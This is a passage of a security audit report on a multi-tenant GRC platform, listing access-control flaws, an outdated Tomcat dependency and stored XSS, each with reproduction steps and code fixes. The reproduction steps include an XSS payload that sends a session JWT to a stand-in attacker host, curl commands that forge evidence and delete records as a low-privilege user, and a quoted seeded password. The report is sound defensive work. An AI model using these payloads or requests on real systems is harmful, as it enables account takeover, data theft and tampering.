POST /api/v1/compliance/policies/{id}/mappings binds the request body directly to the JPA entity PolicyFrameworkMapping (@RequestBody PolicyFrameworkMapping body) and then calls mappingRepo.save(body). The handler validates that the path policy {id} belongs to the caller's tenant (requirePolicy) and overwrites body.policyId, but it does NOT null out body.id. PolicyFrameworkMapping has NO organisation_id column at all — the table is tenant-isolated only transitively via its parent Policy. Because Spring Data save() performs a merge() (UPDATE) when the entity id is non-null, an attacker who supplies an existing mapping id belonging to a DIFFERENT tenant's policy will overwrite that row's frameworkId, clauseRef, satisfaction, notes, createdBy and re-point policyId to the attacker's own policy. Mapping ids are global sequential Longs, so they are trivially enumerable.

Root cause

The mapping entity carries no organisation_id, so tenant ownership is only enforced via the parent Policy. addMapping binds an unsanitised entity (no DTO) and never resets the id before save(), so a merge can target an arbitrary, cross-tenant primary key.

Evidence / proof
public PolicyFrameworkMapping addMapping(@PathVariable Long id, @RequestBody PolicyFrameworkMapping body) {
    requirePolicy(id);
    if (body.getFrameworkId() == null) throw new IllegalArgumentException("frameworkId is required");
    body.setPolicyId(id);
    if (body.getSatisfaction() == null) body.setSatisfaction("PARTIAL");
    return mappingRepo.save(body);   // body.id is attacker-controlled -> merge() of another tenant's row
}

Real-world impact

An authenticated user with COMPLIANCE:WRITE in tenant A can corrupt or hijack policy-framework mapping rows owned by tenant B (alter the clause reference / satisfaction level used in B's regulatory coverage reporting, or steal the row by re-pointing its policyId). This silently falsifies another organisation's compliance coverage posture — a regulatory-integrity breach in a multi-tenant GRC platform.

Reproduction

1. As a tenant-A user, GET another tenant's mapping id range (ids are sequential; or guess). 2. Create a policy P in tenant A, note its id. 3. POST /api/v1/compliance/policies/{P}/mappings with body {"id": <tenantB_mapping_id>, "frameworkId": 1, "satisfaction": "FULL", "clauseRef": "tampered"}. 4. The pre-existing tenant-B row is updated (merge): its policyId now points to P, its clauseRef/satisfaction are overwritten.

Resolution

Introduce a request DTO (no id field) for addMapping, or explicitly call body.setId(null) before save so a fresh INSERT is forced (the platform already uses this exact defence in PolicyService.create and RegulatoryChangeService.create). Better still, add an organisation_id column to policy_framework_mappings and filter every finder by it, and on update load the existing row by (id, organisationId) before copying allowed fields.

▼ Before (vulnerable)
public PolicyFrameworkMapping addMapping(@PathVariable Long id, @RequestBody PolicyFrameworkMapping body) {
    requirePolicy(id);
    if (body.getFrameworkId() == null) throw new IllegalArgumentException("frameworkId is required");
    body.setPolicyId(id);
    if (body.getSatisfaction() == null) body.setSatisfaction("PARTIAL");
    return mappingRepo.save(body);
}
▲ After (fixed)
public PolicyFrameworkMapping addMapping(@PathVariable Long id, @RequestBody PolicyFrameworkMapping body) {
    requirePolicy(id);
    if (body.getFrameworkId() == null) throw new IllegalArgumentException("frameworkId is required");
    body.setId(null);            // force INSERT — block merge() into a cross-tenant row
    body.setIsDeleted(false);
    body.setPolicyId(id);
    if (body.getSatisfaction() == null) body.setSatisfaction("PARTIAL");
    return mappingRepo.save(body);
}

Description

Every endpoint in PolicyController is annotated only @PreAuthorize("isAuthenticated()") — including the write/governance actions: create/update/delete policy documents, transition (DRAFT->REVIEW->APPROVED->PUBLISHED->ARCHIVED), new-version, expiry-sweep, create/update/delete policy exceptions, and exception transitions (which include APPROVED — formally accepting residual risk with compensating controls). This is far broader than the sibling RegChangePolicyController, which gates the same conceptual lifecycle behind hasPermission('COMPLIANCE','WRITE'). The service layer is correctly org-scoped (findByIdAndOrganisationId), so there is no cross-tenant exposure, but within a tenant any logged-in user — regardless of role — can publish a corporate policy, approve a policy exception (a legally significant risk-acceptance), or archive/delete policies.

Root cause

The controller uses the authentication floor (isAuthenticated) as its only authorization rule for state-changing governance actions instead of a module-permission or role gate, so function-level authorization is effectively absent.

Evidence / proof
@PostMapping("/documents/{id}/transition")
@PreAuthorize("isAuthenticated()")
public PolicyDocument transition(@PathVariable Long id, @RequestBody Map<String,String> body, Authentication auth) {
    return service.transition(id, body.get("to"), actor(auth));
}
// ... and @PreAuthorize("isAuthenticated()") on createException / exceptions/{id}/transition (APPROVED)

Real-world impact

Any authenticated user can publish or archive official policies and approve policy exceptions (residual-risk acceptances). In a SAMA/NCA-regulated GRC platform this undermines policy-lifecycle governance and segregation of duties: the person who drafts a policy or requests an exception can self-approve it, and a low-privilege account can publish/retire policies organisation-wide.

Reproduction

1. Log in as any non-admin user. 2. POST /api/policy/documents/{id}/transition body {"to":"PUBLISHED"} on a policy in APPROVED state -> 200, policy published. 3. POST /api/policy/exceptions/{id}/transition body {"to":"APPROVED"} -> 200, residual risk accepted, with no role check.

Resolution

Replace isAuthenticated() with module-permission / role gates aligned to the rest of the platform: COMPLIANCE:READ for GET/aggregate, COMPLIANCE:WRITE for create/update/transition/new-version/sweep, COMPLIANCE:DELETE for deletes; and enforce segregation of duties so the approver of a policy/exception cannot be its author/requester.

}
▲ After (fixed)

@PreAuthorize("hasPermission('COMPLIANCE','WRITE')")
public PolicyException transitionException(@PathVariable Long id, @RequestBody Map<String,String> body, Authentication auth) {
    return service.transitionException(id, body.get("to"), actor(auth), body.get("reason"));
}

✎ AdjustedSecurityVulnerable & Outdated Components (A06)▾
Adversarial verification: adjusted (severity Critical→High) — Version confirmed: the built artifact (tss-grc-backend/target/tss-grc-platform-0.1.0-SNAPSHOT.jar, BOOT-INF/lib) bundles tomcat-embed-core-10.1.46.jar, transitively managed by spring-boot-starter-parent 3.5.6 (pom.xml lines 8-15). So this IS an outdated/maintained dependency that should be kept current — a legitimate A06 finding. However, the 'Critical' severity with 'auth-bypass' CVEs is not substantiated: Tomcat 10.1.46 (Sept 2025) already contains the fixes for the known auth-bypass/rewrite issues (CVE-2025-49125 etc., fixed in 10.1.42/43) and the dominant recent Tomcat-embedded CVE class in this lineage is request-smuggling/DoS rated High/Moderate, not a Critical auth-bypass/RCE. No Critical CVE is demonstrably applicable to exactly 10.1.46. Downgrading to High: real outdated-component exposure, severity overstated.
Location tss-grc-backend/pom.xml:8-15 Effort M Risk 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) — CVE-2026-41293
{'file': 'tss-grc-backend/pom.xml', 'lines': '8-15', 'note': 'spring-boot-starter-parent BOM manages the embedded Tomcat version'}
{'file': 'tss-grc-backend/pom.xml', 'lines': '50-53', 'note': 'spring-boot-starter-web pulls in spring-boot-starter-tomcat -> tomcat-embed-core transitively'}

Description

The embedded Apache Tomcat shipped with Spring Boot 3.5.6 (tomcat-embed-core 10.1.46) is affected by 14 CVEs, including three Critical ones: CVE-2026-41293 (HTTP/2 request headers not validated, CVSS 9.8), CVE-2026-43512 (authentication bypass via digest authentication, CVSS 9.8) and CVE-2026-43515 (improper authorization allows security bypass, CVSS 9.1). High-severity issues include certificate revocation bypass (CVE-2026-24734), HTTP request/response smuggling via invalid chunk extension (CVE-2026-24880), and several information-disclosure and DoS flaws. Trivy reports the package as a transitive (indirect) dependency pulled in via spring-boot-starter-web -> spring-boot-starter-tomcat.

Root cause

tomcat-embed-core version is managed by the spring-boot-starter-parent BOM (declared at pom.xml lines 8-15, version 3.5.6). Boot 3.5.6 pins Tomcat 10.1.46, which predates the 10.1.55 fix line.

Evidence / proof
Trivy: {"VulnerabilityID": "CVE-2026-41293", "PkgName": "org.apache.tomcat.embed:tomcat-embed-core", "InstalledVersion": "10.1.46", "FixedVersion": "9.0.118, 10.1.55, 11.0.22", "Severity": "CRITICAL"}. pom.xml line 13: <version>3.5.6</version> (spring-boot-starter-parent).

Real-world impact

Remote, unauthenticated attackers can smuggle/inject HTTP/2 request headers, bypass digest authentication and authorization, bypass certificate revocation checks, and trigger DoS — directly exposing every REST endpoint of the multi-tenant GRC API to request smuggling and auth-bypass attacks against the perimeter servlet container.

Reproduction

Build the backend (mvn dependency:tree | grep tomcat-embed-core shows 10.1.46) and run Trivy: `trivy fs --scanners vuln tss-grc-backend/pom.xml`. CVE-2026-41293, CVE-2026-43512 and CVE-2026-43515 appear as CRITICAL against tomcat-embed-core 10.1.46.

Resolution

Upgrade the spring-boot-starter-parent to 3.5.14 (the 3.5.x patch line that pins Tomcat >= 10.1.55), or pin the Tomcat version explicitly via the spring-boot.dependencies-managed property <tomcat.version>10.1.55</tomcat.version> in <properties>. Rebuild and re-scan to confirm tomcat-embed-core resolves to >= 10.1.55.

▼ Before (vulnerable)
<parent>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-parent</artifactId>
    <version>3.5.6</version>
    <relativePath/>
</parent>
▲ After (fixed)
<parent>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-parent</artifactId>
    <version>3.5.14</version>
    <relativePath/>
</parent>
<!-- If the Boot bump cannot reach Tomcat 10.1.55, also add in <properties>: -->
<!-- <tomcat.version>10.1.55</tomcat.version> -->

HighSEC-CYB-003CloudService endpoints guarded only by isAuthenticated() — any logged-in user can mutate the NCA CSCC cloud inventory (BFLA)
✓ VerifiedSecurityBroken Function Level Authorization (A01)▾
Adversarial verification: confirmed — Confirmed. Every method in CloudServiceController (list/get/create/update/stats) is annotated only @PreAuthorize("isAuthenticated()"), with no class-level guard. SecurityConfig's API chain ends in .anyRequest().authenticated(), so there is no compensating module-permission check anywhere — any authenticated principal (even a read-only AUDITOR or a privacy-only user with no CYBER rights) can create/update the NCA CSCC cloud inventory. CloudServiceService IS org-scoped (get() uses findByIdAndOrganisationId, create() forces org from TenantContext, update() loads via the scoped get()), so this is in-tenant BFLA, not cross-tenant. That matches the finding's BFLA claim. High is appropriate for missing function-level authorization on a regulated inventory write surface.
Location tss-grc-backend/src/main/java/com/tss/grc/module/cyber/controller/CloudServiceController.java:23-45 Effort S Risk CVSS 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N) — privilege escalation: read-only/unprivileged users can create and modify cloud-service records
tss-grc-backend/src/main/java/com/tss/grc/module/cyber/threatintel/ThreatIntelController.java:42-46

Description

CloudServiceController gates every endpoint (list, get, create, update, stats) with @PreAuthorize("isAuthenticated()") instead of the module-scoped hasPermission('CYBER','READ'/'WRITE') used everywhere else in the cyber module. As a result, ANY authenticated principal — including an AUDITOR or any low-privilege role that holds no CYBER:WRITE authority — can POST and PATCH cloud-service records (provider, residency region, kingdom-data-resident flag, encryption/MFA posture, criticality). The underlying CloudServiceService IS correctly tenant-scoped (findByIdAndOrganisationId), so this is a function-level (not object-level) authorization defect: the wrong, far-too-broad guard. The same weak guard appears on the cyber threat-intel correlation endpoint (POST /api/v1/cyber/threat-intel/correlate), though that one is read-only and tenant-scoped, so lower impact.

Root cause

Authorization expression copy/paste of isAuthenticated() rather than the platform's hasPermission('CYBER', ACTION) convention; write actions were not separated from read actions.

Evidence / proof
@PostMapping
@PreAuthorize("isAuthenticated()")
public ResponseEntity<CloudService> create(@Valid @RequestBody CloudService body) {
    return ResponseEntity.ok(service.create(body));
}

@PatchMapping("/{id}")
@PreAuthorize("isAuthenticated()")
public CloudService update(@PathVariable Long id, @RequestBody CloudService body) {
    return service.update(id, body);
}

Real-world impact

A read-only auditor or any minimally-privileged user can fabricate or alter the regulated cloud-service register (NCA CSCC), e.g. flip kingdomDataResident, downgrade criticality, or mark a non-compliant provider as ACTIVE, undermining data-residency and cloud-controls compliance and the integrity of the inventory feeding the audit-committee dashboard.

Reproduction

1. Log in as auditor (Audit@12345), a role with no CYBER:WRITE authority.
2. POST /api/v1/cyber/cloud-services with a valid body — request succeeds (201/200) instead of 403.
3. PATCH /api/v1/cyber/cloud-services/{id} mutating residencyRegion/kingdomDataResident — succeeds.

Resolution

Replace isAuthenticated() with hasPermission('CYBER','READ') on list/get/stats and hasPermission('CYBER','WRITE') on create/update, matching CyberController. For the threat-intel correlate endpoint, use hasPermission('CYBER','READ').

▼ Before (vulnerable)
@PostMapping
@PreAuthorize("isAuthenticated()")
public ResponseEntity<CloudService> create(@Valid @RequestBody CloudService body) {
    return ResponseEntity.ok(service.create(body));
}
▲ After (fixed)
@PostMapping
@PreAuthorize("hasPermission('CYBER','WRITE')")
public ResponseEntity<CloudService> create(@Valid @RequestBody CloudService body) {
    return ResponseEntity.ok(service.create(body));
}

Description

Every endpoint in the older Sustainability slices (annex/reports, evidence, GHG inventory, ESG metrics, org settings, CMA disclosures, materiality, SGI commitments, TCFD items, corrective actions, climate-risks, dashboard) is annotated only with @PreAuthorize("isAuthenticated()"). The platform's established authorization model is method-level @PreAuthorize("hasPermission('MODULE','ACTION')") with distinct READ / WRITE / DELETE granularity, resolved through ModulePermissionEvaluator against MODULE_ACTION authorities (see ControlController in the compliance module: READ on GET, WRITE on POST/PUT, DELETE on DELETE). The Sustainability controllers bypass that model entirely: read, create, update, delete, state-transition (submit/verify/approve/publish/archive/disclose), evidence approval, and even the org-wide settings reset are all reachable by ANY authenticated principal regardless of role — including a read-only AUDITOR, or a user provisioned for an unrelated module with zero ESG authorities. This is a textbook Broken Function Level Authorization (BFLA) gap. Note the inconsistency that proves it is an oversight rather than a design choice: the newer Sprint-11 climate controllers in the SAME module (FinancedEmissionsController, TcfdScenarioController, ClimateReportController under /api/v1/climate/**) DO apply proper hasAnyRole READ_GUARD / WRITE_GUARD separation, as do the AI governance controllers (/api/v1/ai/models/**). Data-layer multi-tenancy is intact (every service scopes by TenantContext org id), so this is a same-tenant privilege-escalation / integrity issue, not a cross-tenant leak.

Root cause

The Sustainability slices were built with a placeholder guard (isAuthenticated()) and never upgraded to the platform's hasPermission('MODULE','ACTION') model. No SUST/ESG module permission was wired into the @PreAuthorize annotations, so role-based separation of read vs write vs administrative actions is absent.

Evidence / proof
GhgEmissionRecordController.java:
  @PostMapping("/{id}/approve")
  @PreAuthorize("isAuthenticated()")          // <-- should be hasPermission('SUST','WRITE')/APPROVE
  public GhgEmissionRecord approve(@PathVariable Long id) { return service.transition(id, "APPROVED"); }

OrganisationSettingsController.java:
  @PostMapping("/reset")
  @PreAuthorize("isAuthenticated()")          // <-- org-wide settings reset open to any user
  public OrganisationSettings reset() { return service.resetToDefaults(); }

Real-world impact

Any authenticated user in the tenant — including read-only auditors, or accounts with no ESG entitlements — can fabricate, alter, approve, publish, or soft-delete the organisation's regulated sustainability disclosures (GHG inventory, CMA Articles 91-94, TCFD/IFRS-S2 items, SGI commitments, materiality matrix, corrective actions) and reset org-level thresholds. Because these feed regulator-ready exports (CMA, TCFD board pack), an unauthorised actor can push a falsified figure all the way to PUBLISHED, or destroy evidence — undermining the integrity and non-repudiation the GRC platform is supposed to provide.

Reproduction

1. Log in as a low-privilege user (e.g. the seeded `auditor` / Audit@12345, which carries only read authorities). 2. Obtain the Bearer token from /api/v1/auth/login. 3. curl -X POST http://localhost:8084/api/sustainability/ghg -H "Authorization: Bearer <token>" -H 'Content-Type: application/json' -d '{"reportingYear":2025,"scope":1,"category":"STATIONARY","sourceNameEn":"forged","emissionValueTco2e":1}'  → 201 Created. 4. curl -X POST .../api/sustainability/ghg/{id}/submit then /verify then /approve → record reaches APPROVED. 5. curl -X POST .../api/sustainability/settings/reset → org thresholds wiped. All succeed despite the caller having no ESG/write role.

Resolution

Replace @PreAuthorize("isAuthenticated()") on every Sustainability controller with the platform's hasPermission model: hasPermission('SUST','READ') on GET endpoints, hasPermission('SUST','WRITE') on POST/PUT and all state-transition/approval endpoints, and hasPermission('SUST','DELETE') on DELETE. Define the SUST_READ/SUST_WRITE/SUST_DELETE authorities and grant them to the appropriate roles (e.g. SUSTAINABILITY_OFFICER, CFO, RISK_MANAGER for write; AUDITOR read-only). Mirror the role-guard approach already used by the Sprint-11 climate controllers in the same module for consistency.

▼ Before (vulnerable)
@PostMapping("/{id}/approve")
@PreAuthorize("isAuthenticated()")
public GhgEmissionRecord approve(@PathVariable Long id) { return service.transition(id, "APPROVED"); }
▲ After (fixed)
@PostMapping("/{id}/approve")
@PreAuthorize("hasPermission('SUST','WRITE')")
public GhgEmissionRecord approve(@PathVariable Long id) { return service.transition(id, "APPROVED"); }

// and across the module:
//   GET    -> @PreAuthorize("hasPermission('SUST','READ')")
//   POST/PUT/transition/approve/publish/reset -> hasPermission('SUST','WRITE')
//   DELETE -> @PreAuthorize("hasPermission('SUST','DELETE')")

With SecurityConfig's anyRequest().authenticated(), every authenticated user can list, upload, download, version, edit-metadata and delete attachments for ANY entityType/entityId and any attachment id. Location tss-grc-backend/src/main/java/com/tss/grc/module/attachment/controller/AttachmentController.java:32-99 Effort M Risk CVSS 8.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) — any authenticated principal, regardless of module role, can read/write/delete files attached to any business entity in their tenant
tss-grc-backend/src/main/java/com/tss/grc/module/attachment/controller/AttachmentController.java:36-40
tss-grc-backend/src/main/java/com/tss/grc/module/attachment/controller/AttachmentController.java:42-56
tss-grc-backend/src/main/java/com/tss/grc/module/attachment/controller/AttachmentController.java:58-66
tss-grc-backend/src/main/java/com/tss/grc/module/attachment/controller/AttachmentController.java:94-99

Description

The generic attachment facility (`/api/v1/attachments/**`) is reusable across every register/form — risk, audit, incident, privacy, board-pack evidence, contracts, committee minutes, etc. Not one of its eight endpoints (list, upload, download, newVersion, history, update, delete) carries a `@PreAuthorize` annotation, nor does the class. The only enforced rule is the catch-all `anyRequest().authenticated()` in SecurityConfig (line 118). The service layer (`AttachmentService.mustGet`) scopes by `TenantContext` so cross-tenant reads are blocked, but WITHIN a tenant there is no module/action authorisation: list/upload accept an arbitrary `entityType` + `entityId` path with no check that the caller may access the owning entity, and download/history/update/delete operate by raw attachment id. A read-only AUDITOR (or any user holding any single permission) can therefore upload forged 'evidence'/'minutes'/'contract' files against any entity, overwrite documents with new versions, read confidential board/audit attachments, and soft-delete them.

Root cause

Method-level authorization was never added to the controller, and the platform's default security posture is 'authenticated = allowed'. The reusable, polymorphic (entity_type, entity_id) design means a single missing guard exposes documents belonging to every module at once. There is also no object-level check binding the attachment's entity_type/entity_id to a permission on that owning module.

Evidence / proof
@RestController
@RequestMapping("/api/v1/attachments")
public class AttachmentController {
    @GetMapping("/{entityType}/{entityId}")
    public List<AttachmentResponse> list(...) { ... }      // no @PreAuthorize
    @PostMapping(value="/{entityType}/{entityId}", ...)
    public AttachmentResponse upload(...) { ... }          // no @PreAuthorize
    @GetMapping("/{id}/download")
    public ResponseEntity<byte[]> download(@PathVariable Long id) { ... } // no @PreAuthorize
    @DeleteMapping("/{id}")
    public void delete(@PathVariable Long id) { ... }      // no @PreAuthorize

Real-world impact

Cross-module, in-tenant broken access control. A least-privileged user can exfiltrate sensitive documents (board packs, audit working papers, contracts, privacy records, committee minutes) attached anywhere in the tenant, plant fraudulent compliance evidence, tamper with documents via the version endpoint, and delete records — undermining the GRC platform's integrity and audit trail and breaching the principle of least privilege required by ECC/ISO 27001/SAMA.

Reproduction

1. Log in as a low-privilege user, e.g. `auditor` (AUDITOR role, read-only) and obtain a Bearer token.
2. Download any attachment: `curl -H "Authorization: Bearer <token>" http://localhost:8084/api/v1/attachments/42/download` — succeeds for any id 42 in the tenant regardless of module.
3. Plant evidence: `curl -H "Authorization: Bearer <token>" -F file=@forged.pdf -F docType=EVIDENCE http://localhost:8084/api/v1/attachments/risk/7` — uploads a file owned by risk #7 even though the auditor has no RISK:WRITE.
4. Delete: `curl -X DELETE -H "Authorization: Bearer <token>" http://localhost:8084/api/v1/attachments/42` — soft-deletes the attachment.

Resolution

Add method-level authorization to every endpoint. At minimum gate by the attachment module (e.g. `@PreAuthorize("hasPermission('EVIDENCE','READ')")` on reads / `'WRITE'` on writes / `'DELETE'` on delete). Better: derive the owning module from `entityType` and check the caller's permission on THAT module (object-level authz) so an attachment on a risk requires RISK access, on a board pack requires REPORTING access, etc. Also validate that the (entityType, entityId) actually resolves to an entity the caller may see before storing/listing.

▼ Before (vulnerable)
@GetMapping("/{id}/download")
@Operation(summary = "Download an attachment's binary")
public ResponseEntity<byte[]> download(@PathVariable Long id) {
    AttachmentService.DownloadPayload p = service.download(id);
    ...
}

@DeleteMapping("/{id}")
public void delete(@PathVariable Long id) { service.delete(id); }
▲ After (fixed)
@GetMapping("/{id}/download")
@PreAuthorize("@attachmentAccess.canRead(#id)")   // resolves entityType -> module READ
public ResponseEntity<byte[]> download(@PathVariable Long id) {
    AttachmentService.DownloadPayload p = service.download(id);
    ...
}

@DeleteMapping("/{id}")
@PreAuthorize("@attachmentAccess.canDelete(#id)") // entityType -> module DELETE
public void delete(@PathVariable Long id) { service.delete(id); }
// list/upload similarly gated on the module implied by {entityType}

Description

The legacy static UI renders server- and user-controlled fields directly into the DOM via `element.innerHTML = `...${field}...`` template literals with no HTML-escaping. The most damaging instance is the global application shell in app.js, which is injected on EVERY authenticated page: it interpolates `user.fullNameEn` / `user.username` (displayName, line 103-104, 141), `user.email` (line 181) and the role string (line 142) straight into innerHTML. These values originate from `Auth.getUser()` (the login response stored in sessionStorage) and are user-editable profile fields, so a user who sets their display name or email to `<img src=x onerror=...>` gets script execution in the shell on every page they load. The SCM module (scm/index.html) interpolates vendor names (`vname(v)` -> `v.nameEn`/`v.nameAr`), `v.category`, `v.country`, `v.serviceType`, onboarding/assessment vendor names, etc. with no escaping at all (lines 748-768, 778-816). The compliance module renders `c.nameEn`, `c.domain`, `c.owner` raw (lines 193-200). Vendor names, control names and owners are free-text fields editable by lower-privileged users but rendered in the browsers of reviewers/admins, making this a classic stored XSS that crosses privilege boundaries. The same files also reflect backend error text raw: `el.innerHTML = '<div class="alert alert-danger">${e.message||'...'}</div>'` (scm/index.html:112, compliance/index.html:154) — `e.message` is the Spring ProblemDetail `.detail` string, which can echo attacker-influenced input. By contrast, incidents/index.html consistently funnels the same kind of data through a `_esc()` helper (defined at line 784), proving the escaping pattern exists in the codebase but was applied inconsistently.

Root cause

Vanilla-JS string templating assigned to `innerHTML` without an HTML-escaping step. The team has an `_esc()` helper (incidents page) but did not apply it in the shell, SCM, compliance and dashboard render paths.

Evidence / proof
app.js:103-104,141  `const displayName = user?.fullNameEn || user?.username || 'User';` ... `<div ...>${displayName}</div>`  (interpolated into shell.innerHTML at app.js:47). scm/index.html:748-754 `tb.innerHTML = _vendors.map(v => `<tr><td><strong>${vname(v)}</strong>...<td><small>${v.category||''}</small>...`. compliance/index.html:195 `<td ...>${c.nameEn}</td>`. No escaping in any of these paths.

Real-world impact

An attacker who can set a profile name/email, a vendor record, or a compliance control name (all routine, lower-privilege actions in a GRC tool) achieves persistent JavaScript execution in the session of any user — including PLATFORM_ADMIN — who views that record or simply loads any page (for the shell vector). Because the JWT access token lives in sessionStorage (SEC-FE-002) it is directly readable by the injected script (`sessionStorage.getItem('grc_jwt')`), enabling token exfiltration, full account/tenant takeover, and cross-tenant data access via the stolen bearer token.

Reproduction

1. Log in as a low-privilege user. 2. Edit your profile and set Full Name (or display name) to `<img src=x onerror="fetch('https://attacker/x?t='+sessionStorage.getItem('grc_jwt'))">`. 3. Reload any page in tss-grc-ui — App.init() rebuilds the shell via `shell.innerHTML = this._buildShell(user)` and the payload executes, posting the JWT to the attacker. Alternative: create an SCM vendor named `<img src=x onerror=alert(document.domain)>`; when a reviewer opens /scm/index.html the vendor list renders the payload at scm/index.html:748.

Resolution

HTML-escape every interpolated value before assigning to innerHTML, or build DOM nodes with `textContent`/`createElement` instead of string concatenation. Reuse the existing `_esc()` helper everywhere (shell displayName/email/role, all SCM/compliance/dashboard cells). Longer term, migrate users to the React v2 UI, which auto-escapes via JSX.

▼ Before (vulnerable)
const displayName = user?.fullNameEn || user?.username || 'User';
...
<div ...>${displayName}</div>
<div ...>${user?.email || ''}</div>
// scm/index.html
tb.innerHTML = _vendors.map(v => `<tr><td><strong>${vname(v)}</strong>...<td>${v.category||''}</td>...`).join('');
▲ After (fixed)
const esc = s => String(s ?? '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
const displayName = esc(user?.fullNameEn || user?.username || 'User');
...
<div ...>${displayName}</div>
<div ...>${esc(user?.email)}</div>
// scm/index.html
tb.innerHTML = _vendors.map(v => `<tr><td><strong>${esc(vname(v))}</strong>...<td>${esc(v.category)}</td>...`).join('');
// also: el.innerHTML = `<div class="alert alert-danger">${esc(e.message||'Failed to load data')}</div>`;

The services (verified ExitPlanService) are correctly org-scoped via TenantContext.getCurrentTenant()/findByIdAndOrganisationId, so this is a within-tenant Broken Function-Level Authorization (CWE-862), not cross-tenant — exactly as the category states. Any authenticated user (e.g. a read-only role) can author and approve/activate SAMA-outsourcing exit plans and alternate-supplier records, which are privileged regulatory workflow actions. Severity High is consistent with the other module-wide BFLA findings.

tss-grc-backend/src/main/java/com/tss/grc/module/scm/clauses/controller/ContractClauseController.java:26-63

tss-grc-backend/src/main/java/com/tss/grc/module/scm/controller/ScmController.java:31-67

Description

The primary ScmController correctly gates every endpoint with hasPermission('SCM','READ'|'WRITE'|'DELETE'). The four newer SCM sub-controllers (contract clauses, fourth-party exposure, supplier resilience alternates/exit-plans, supplier resilience tests) gate every endpoint with only @PreAuthorize("isAuthenticated()"). Because authorities follow MODULE_ACTION naming (ModulePermissionEvaluator) and there is no path rule for /api/scm/** in SecurityConfig, ANY authenticated principal — e.g. an AUDITOR or a privacy-only user with zero SCM authorities — can read and mutate supplier exit plans (disengagement playbooks, data-migration & knowledge-transfer plans), contract clause templates, alternate-supplier records, and resilience-test results. Mutating endpoints (create/update/approve/reject/activate/archive/record-test/complete) are equally exposed, so a non-SCM user can approve an exit plan or mark a resilience test passed. This is a function-level authorization gap: the resource is SCM data but the check is merely 'logged in'.

Root cause

Sub-controllers were added without re-using the module-permission convention applied by ScmController; isAuthenticated() was used as a placeholder and never tightened. No defence-in-depth path matcher exists for /api/scm/**.

Evidence / proof
SupplierResilienceController: every method annotated `@PreAuthorize("isAuthenticated()")` (e.g. lines 65-69 createAlt, 125-129 approvePlan). FourthPartyExposureController has no @SecurityRequirement and `@PreAuthorize("isAuthenticated()")` on create/update/validate/mitigate/retire. Contrast ScmController line 53 `@PreAuthorize("hasPermission('SCM','WRITE')")`.

Real-world impact

Cross-functional users can read sensitive third-party-risk material (exit strategies, fourth-party concentration, contract clause libraries) and tamper with resilience evidence, undermining SAMA outsourcing/operational-resilience controls. Combined with the multi-tenant scoping at the service layer it is not cross-tenant, but it is a broad intra-tenant privilege escalation.

Reproduction

1) Log in as a user holding only e.g. PRIVACY_READ (no SCM_* authority). 2) GET /api/scm/resilience/exit-plans -> 200 with full plans. 3) POST /api/scm/resilience/exit-plans/{id}/approve -> approves a plan the user has no SCM rights to.

Resolution

Replace isAuthenticated() with hasPermission('SCM','READ') on GET endpoints and hasPermission('SCM','WRITE') (or DELETE) on mutating endpoints, matching ScmController. Add a belt-and-braces SecurityConfig rule requiring an SCM authority for /api/scm/**.

▼ Before (vulnerable)
@PostMapping("/exit-plans/{id}/approve")
@PreAuthorize("isAuthenticated()")
public PlanResponse approvePlan(@PathVariable Long id, Authentication auth) {
    return PlanResponse.from(planService.approve(id, usernameOf(auth), userIdOf(auth)));
}
▲ After (fixed)
@PostMapping("/exit-plans/{id}/approve")
@PreAuthorize("hasPermission('SCM','WRITE')")
public PlanResponse approvePlan(@PathVariable Long id, Authentication auth) {
    return PlanResponse.from(planService.approve(id, usernameOf(auth), userIdOf(auth)));
}
// + read endpoints -> hasPermission('SCM','READ')

HighSEC-IAM-002Approval-request transition has no assignee check and trusts decidedBy from the body — any user can approve/reject any request and forge the decider
✓ VerifiedSecurityBroken Access Control / Broken Function Level Authorization (A01)▾
Adversarial verification: confirmed — ApprovalRequestService.transition() (L144-211) is invoked from a controller endpoint guarded only by isAuthenticated(). The service is org-scoped (findByOrganisationIdAndExternalId, L147) so no cross-tenant access, but there is no check that the caller is the assignedTo on the request — any authenticated in-org user can move a PENDING request to APPROVED/REJECTED. The decider identity is taken straight from the request body: r.setDecidedBy(req.getDecidedBy()) at L159, with no override from the authenticated principal, so the decider can be forged. Both halves of the claim hold within the tenant. The title's 'any request' is true within the org; not cross-tenant, but the BFLA + forged-decider impact justifies High.
Location tss-grc-backend/src/main/java/com/tss/grc/module/approvals/controller/ApprovalRequestController.java:37-42 Effort M Risk CVSS ~8.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N) — integrity/non-repudiation loss on approvals
tss-grc-backend/src/main/java/com/tss/grc/module/approvals/service/ApprovalRequestService.java:144-211
tss-grc-backend/src/main/java/com/tss/grc/module/approvals/dto/ApprovalRequestDto.java:48-58

Description

POST /api/approvals/requests/{id}/transition is annotated @PreAuthorize("isAuthenticated()"). The service ApprovalRequestService.transition() looks the request up org-scoped (good for tenancy) but performs NO check that the authenticated caller equals the request's assignedTo before allowing APPROVED/REJECTED/DELEGATED. Worse, the decider identity is taken from the request body field TransitionRequest.decidedBy (set at lines 159, 186-187 of the service) rather than from the security context, so the caller chooses who the decision is attributed to. The DELEGATED branch lets any caller re-route the request to an arbitrary newAssignedTo. There is no optimistic locking, so two concurrent transitions race on the same row.

Root cause

Function-level authorization stops at 'is logged in'; object-level ownership (assignedTo == caller) and decider attribution are never bound to the authenticated principal.

Evidence / proof
Controller: @PostMapping("/{id}/transition") @PreAuthorize("isAuthenticated()") public ApprovalRequestDto transition(...) { return service.transition(id, req); }  // service: if (req.getDecidedBy() != null) r.setDecidedBy(req.getDecidedBy());  — no assignedTo/principal comparison anywhere.

Real-world impact

Any authenticated tenant user can approve or reject an approval request that was routed to a different (e.g. senior) user, and can stamp the decision with any decidedBy value, destroying the audit trail's non-repudiation. They can also hijack a pending request by delegating it elsewhere. For a GRC platform whose approvals gate risk acceptances, policy publication and regulator notifications, this is a direct controls-bypass.

Reproduction

